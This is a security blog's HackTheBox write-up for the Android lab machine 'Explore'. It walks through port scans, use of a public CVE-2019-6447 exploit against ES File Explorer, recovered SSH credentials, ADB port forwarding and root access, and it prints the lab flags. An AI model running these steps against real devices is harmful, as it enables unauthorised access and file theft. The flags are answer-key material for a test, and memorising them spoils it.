@@ -1,0 +1,174 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="HTB - EXPLORE (Android-Machine)  Enumeration Machine IP export IP=10.10.10.247Nmap Scan Results   Nmap May take some time to sacn all 65535 ports
+  So we will use RUSTSCAN
+  Using Rustscan to Find all open ports rustscan -a 10.10.10.247
+  Open 10.10.10.247:2222Open 10.10.10.247:37721Open 10.10.10.247:59777 Now Use NMAP to scan these Open Ports nmap -p 2222,37721,59777 10.10.10.247 -vvv -sV -A -sC  PORT STATE SERVICE REASON VERSION2222/tcp open ssh syn-ack ttl 63 (protocol 2."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-explore/><title>HackTheBox: Explore :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Explore"><meta itemprop=description content="HTB - EXPLORE (Android-Machine)  Enumeration Machine IP export IP=10.10.10.247Nmap Scan Results   Nmap May take some time to sacn all 65535 ports
+  So we will use RUSTSCAN
+  Using Rustscan to Find all open ports rustscan -a 10.10.10.247
+  Open 10.10.10.247:2222Open 10.10.10.247:37721Open 10.10.10.247:59777 Now Use NMAP to scan these Open Ports nmap -p 2222,37721,59777 10.10.10.247 -vvv -sV -A -sC  PORT STATE SERVICE REASON VERSION2222/tcp open ssh syn-ack ttl 63 (protocol 2."><meta itemprop=datePublished content="2022-02-21T00:00:00+00:00"><meta itemprop=dateModified content="2022-02-21T00:00:00+00:00"><meta itemprop=wordCount content="832"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Explore"><meta name=twitter:description content="HTB - EXPLORE (Android-Machine)  Enumeration Machine IP export IP=10.10.10.247Nmap Scan Results   Nmap May take some time to sacn all 65535 ports
+  So we will use RUSTSCAN
+  Using Rustscan to Find all open ports rustscan -a 10.10.10.247
+  Open 10.10.10.247:2222Open 10.10.10.247:37721Open 10.10.10.247:59777 Now Use NMAP to scan these Open Ports nmap -p 2222,37721,59777 10.10.10.247 -vvv -sV -A -sC  PORT STATE SERVICE REASON VERSION2222/tcp open ssh syn-ack ttl 63 (protocol 2."><meta property="og:title" content="HackTheBox: Explore"><meta property="og:description" content="HTB - EXPLORE (Android-Machine)  Enumeration Machine IP export IP=10.10.10.247Nmap Scan Results   Nmap May take some time to sacn all 65535 ports
+  So we will use RUSTSCAN
+  Using Rustscan to Find all open ports rustscan -a 10.10.10.247
+  Open 10.10.10.247:2222Open 10.10.10.247:37721Open 10.10.10.247:59777 Now Use NMAP to scan these Open Ports nmap -p 2222,37721,59777 10.10.10.247 -vvv -sV -A -sC  PORT STATE SERVICE REASON VERSION2222/tcp open ssh syn-ack ttl 63 (protocol 2."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-explore/"><meta property="article:published_time" content="2022-02-21T00:00:00+00:00"><meta property="article:modified_time" content="2022-02-21T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-02-21 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>S3cur!ty_Bl0g</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-explore/>HackTheBox: Explore</a></h2><div class=post-content><h1 id=htb---explore-android-machine>HTB - EXPLORE (Android-Machine)</h1><hr><h2 id=enumeration>Enumeration</h2><h4 id=machine-ip>Machine IP</h4><pre><code>export IP=10.10.10.247
+
+</code></pre><h4 id=nmap-scan-results>Nmap Scan Results</h4><ul><li><p>Nmap May take some time to sacn all 65535 ports</p></li><li><p>So we will use RUSTSCAN</p></li><li><p>Using Rustscan to Find all open ports <code>rustscan -a 10.10.10.247</code></p></li></ul><pre><code>Open 10.10.10.247:2222
+Open 10.10.10.247:37721
+Open 10.10.10.247:59777
+
+</code></pre><ul><li>Now Use NMAP to scan these Open Ports
+<code>nmap -p 2222,37721,59777 10.10.10.247 -vvv -sV -A -sC</code></li></ul><pre><code>PORT      STATE SERVICE REASON         VERSION
+2222/tcp  open  ssh     syn-ack ttl 63 (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
+37721/tcp open  unknown syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:57:56 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest: 
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Sat, 11 Sep 2021 12:57:56 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 501 Not Implemented
+|     Date: Sat, 11 Sep 2021 12:58:02 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:58:20 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:58:02 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:58:20 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ?G???,???`~?
+|     ??{????w????&lt;=?o?
+|   TLSSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:58:21 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ??random1random2random3random4
+|   TerminalServerCookie: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Sat, 11 Sep 2021 12:58:21 GMT
+|     Content-Length: 54
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|_    Cookie: mstshash=nmap
+59777/tcp open  http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+
+
+</code></pre><pre><code>
+PORT      STATE SERVICE REASON         VERSION
+2222/tcp  open  ssh     syn-ack ttl 63 (protocol 2.0)/SSH-2.0-SSH Server - Banana Studio
+59777/tcp open  http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+37721/tcp open  unknown syn-ack ttl 63
+
+</code></pre><ul><li><p>Using the NMAP OS detection We can also figure out its an ANDROID MACHINE</p></li><li><p>We have Found that Port <code>2222</code> is running a SSH Server</p></li></ul><hr><h2 id=exploitation>EXPLOITATION</h2><ul><li><p>After further research about port <code>59777</code> on android devices , we found a CVE</p></li><li><p><code>59777</code> is an Open port on ES FILE EXPLORER and Vulnerable to <code>CVE-2019-6447</code></p></li><li><p>We can find the exploit for this CVE on github or exploit-db</p></li></ul><pre><code>https://www.exploit-db.com/exploits/50070
+
+https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+
+</code></pre><ul><li>We will use Exploit-DB Exploit Code.</li></ul><pre><code>python3 exploit.py listFiles 10.10.10.247
+
+</code></pre><ul><li><p>It will list all the files present, Nothing interesting here</p></li><li><p>Let&rsquo;s Try to check the available Pictures</p></li></ul><pre><code>python3 exploit.py listPics 10.10.10.247
+
+</code></pre><pre><code>==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+name : concept.jpg
+time : 4/21/21 02:38:08 AM
+location : /storage/emulated/0/DCIM/concept.jpg
+size : 135.33 KB (138,573 Bytes)
+
+name : anc.png
+time : 4/21/21 02:37:50 AM
+location : /storage/emulated/0/DCIM/anc.png
+size : 6.24 KB (6,392 Bytes)
+
+name : creds.jpg
+time : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size : 1.14 MB (1,200,401 Bytes)
+
+name : 224_anc.png
+time : 4/21/21 02:37:21 AM
+location : /storage/emulated/0/DCIM/224_anc.png
+size : 124.88 KB (127,876 Bytes)
+
+
+</code></pre><ul><li><p>Found a interesting File <code>creds.jpg</code></p></li><li><p>Lets get this file.</p></li></ul><pre><code>└─# python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg 
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+
+[+] Downloading file...
+[+] Done. Saved as `out.dat`.
+
+</code></pre><pre><code>mv out.dat creds.jpg
+
+</code></pre><ul><li>Looks like this image contains the SSH Username And Credentials</li></ul><pre><code>kristi:Kr1sT!5h@Rp3xPl0r3!
+
+</code></pre><hr><h2 id=getting-user-access--user-flag>GETTING USER ACCESS / USER FLAG</h2><ul><li>Let&rsquo;s SSH into the machine</li></ul><pre><code>ssh kristi@10.10.10.247 -p 2222
+
+</code></pre><ul><li>We can find the User Flag at <code>/sdcard/user.txt</code></li></ul><pre><code>f32017174c7c7e8f50c6da52891ae250
+
+</code></pre><hr><h2 id=priviledge-escalation>PRIVILEDGE ESCALATION</h2><ul><li><p>Further Enumerating the user we have found that some Localhost Ports are running</p></li><li><p>Listing all Open Ports <code>netstat -a</code></p></li></ul><pre><code>130|:/sdcard $ netstat -a                                                      
+Active Internet connections (established and servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp6       0      0 localhost:37509         :::*                    LISTEN     
+tcp6       0      0 ::ffff:10.10.10.2:38989 :::*                    LISTEN     
+tcp6       0      0 :::2222                 :::*                    LISTEN     
+tcp6       0      0 :::5555                 :::*                    LISTEN     
+tcp6       0      0 :::42135                :::*                    LISTEN     
+tcp6       0      0 :::59777                :::*                    LISTEN 
+
+</code></pre><ul><li><p>Further researching , we found that <code>PORT 5555</code> is ADB PORT, To access the Machine using ADB.</p></li><li><p>We can Forward this USER MACHINE local port to our Attacker Machine using SSH PORT FORWARDING, as We already have access to SSH Credentials.</p></li></ul><hr><h4 id=ssh-port-forwarding>SSH PORT FORWARDING</h4><ul><li>Using Command <code>ssh kristi@10.10.10.247 -L 5555:localhost:5555 -p 2222</code></li></ul><hr><ul><li>Now Lets Connect to the PORT:5555 , Using ADB</li></ul><pre><code>adb connect localhost:5555
+
+</code></pre><ul><li>List Connected Devices</li></ul><pre><code>adb devices
+
+</code></pre><ul><li>Getting a Shell</li></ul><pre><code>adb shell
+OR 
+adb -s emulator-5554 shell
+
+</code></pre><ul><li>Getting root Access and getting Root Flag</li></ul><pre><code>su
+
+cat /data/root.txt
+</code></pre><ul><li>Root Flag</li></ul><pre><code>f04fc82b6d49b41c9b08982be59338c5
+</code></pre><hr><hr><h1 id=3-explore-has-been-pwned>&lt;3 EXPLORE HAS BEEN PWNED!</h1></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>
